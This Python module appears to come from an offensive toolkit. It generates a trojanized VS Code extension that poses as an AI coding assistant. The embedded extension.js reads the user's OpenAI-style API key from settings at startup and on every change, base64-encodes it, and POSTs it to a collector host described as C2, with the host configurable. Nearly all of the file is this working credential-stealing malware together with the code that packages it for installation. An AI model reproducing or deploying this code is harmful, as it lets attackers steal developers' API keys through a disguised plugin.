# -*- coding: utf-8 -*-
"""
IDE Plugin Credential Harvester (JetBrains/VS Code style)
Generates a malicious plugin that appears to be an AI assistant but steals API keys.
"""

import json
import shutil
from pathlib import Path

from .base import AttackModule
from config.settings import IDE_CONFIG
from utils.exfil import ExfilChannel

class IdePluginGenerator(AttackModule):
    """生成恶意IDE插件，窃取AI API密钥"""

    def __init__(self, output_dir, **kwargs):
        super().__init__(**kwargs)
        self.output_dir = Path(output_dir)
        self.plugin_name = IDE_CONFIG["plugin_name"]
        self.publisher = IDE_CONFIG["publisher"]
        self.version = IDE_CONFIG["version"]

    def _create_vscode_manifest(self):
        manifest = {
            "name": self.plugin_name.replace(" ", "-").lower(),
            "displayName": self.plugin_name,
            "description": "AI-powered coding assistant with advanced code analysis.",
            "version": self.version,
            "publisher": self.publisher,
            "engines": {"vscode": "^1.85.0"},
            "categories": ["AI", "Programming"],
            "activationEvents": ["onStartupFinished"],
            "main": "./out/extension.js",
            "contributes": {
                "configuration": {
                    "title": "AI Assistant",
                    "properties": {
                        "aiAssistant.apiKey": {
                            "type": "string",
                            "description": "Your OpenAI API key",
                            "default": ""
                        }
                    }
                }
            }
        }
        return json.dumps(manifest, indent=2)

    def _create_extension_js(self):
        return """
// extension.js - VSCode plugin with hidden exfiltration
const vscode = require('vscode');

function activate(context) {
    console.log('AI Assistant activated.');

    // Hook into configuration change to capture API key
    context.subscriptions.push(
        vscode.workspace.onDidChangeConfiguration(e => {
            if (e.affectsConfiguration('aiAssistant.apiKey')) {
                const config = vscode.workspace.getConfiguration('aiAssistant');
                const key = config.get('apiKey');
                if (key && key.startsWith('sk-')) {
                    // Exfiltrate the key
                    exfiltrate(key);
                }
            }
        })
    );

    // Also check initial configuration
    const config = vscode.workspace.getConfiguration('aiAssistant');
    const initialKey = config.get('apiKey');
    if (initialKey && initialKey.startsWith('sk-')) {
        exfiltrate(initialKey);
    }

    // Provide a harmless command
    let disposable = vscode.commands.registerCommand('ai-assistant.hello', () => {
        vscode.window.showInformationMessage('Hello from AI Assistant!');
    });
    context.subscriptions.push(disposable);
}

function exfiltrate(apiKey) {
    // Obfuscate key
    const encoded = btoa(apiKey);
    // Send to C2 via HTTP
    const payload = {
        event: 'key_captured',
        key: encoded,
        timestamp: Date.now(),
        vscode_version: vscode.version
    };
    fetch('https://telemetry-collector.example.com/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(() => {});
}

function deactivate() {}

module.exports = { activate, deactivate };
"""
        # 替换域名
        return """// extension.js
const vscode = require('vscode');
const https = require('https');

function activate(context) {
    console.log('AI Assistant activated.');
    context.subscriptions.push(
        vscode.workspace.onDidChangeConfiguration(e => {
            if (e.affectsConfiguration('aiAssistant.apiKey')) {
                const config = vscode.workspace.getConfiguration('aiAssistant');
                const key = config.get('apiKey');
                if (key && key.length > 10) {
                    exfiltrate(key);
                }
            }
        })
    );
    const config = vscode.workspace.getConfiguration('aiAssistant');
    const initialKey = config.get('apiKey');
    if (initialKey && initialKey.length > 10) {
        exfiltrate(initialKey);
    }
    let disposable = vscode.commands.registerCommand('ai-assistant.hello', () => {
        vscode.window.showInformationMessage('AI Assistant ready.');
    });
    context.subscriptions.push(disposable);
}

function exfiltrate(key) {
    const payload = JSON.stringify({
        key: Buffer.from(key).toString('base64'),
        ts: Date.now(),
        v: vscode.version
    });
    const options = {
        hostname: 'telemetry-collector.example.com',
        port: 443,
        path: '/collect',
        method: 'POST',
        headers: {'Content-Type': 'application/json', 'Content-Length': payload.length}
    };
    const req = https.request(options, () => {});
    req.on('error', () => {});
    req.write(payload);
    req.end();
}

function deactivate() {}
module.exports = { activate, deactivate };
""".replace('telemetry-collector.example.com', self.kwargs.get('c2_host', 'telemetry-collector.example.com'))

    def execute(self):
        self.logger.info(f"Generating malicious VS Code plugin in {self.output_dir}")

        if self.output_dir.exists():
            shutil.rmtree(self.output_dir)
        self.output_dir.mkdir(parents=True)

        (self.output_dir / "package.json").write_text(self._create_vscode_manifest())
        # Create out directory for extension.js
        out_dir = self.output_dir / "out"
        out_dir.mkdir(exist_ok=True)
        (out_dir / "extension.js").write_text(self._create_extension_js())

        self.result["success"] = True
        self.result["data"] = {
            "plugin_dir": str(self.output_dir),
            "instructions": "To test: open in VSCode, press F5 to launch Extension Development Host, then configure API key in settings."
        }
        return self.result
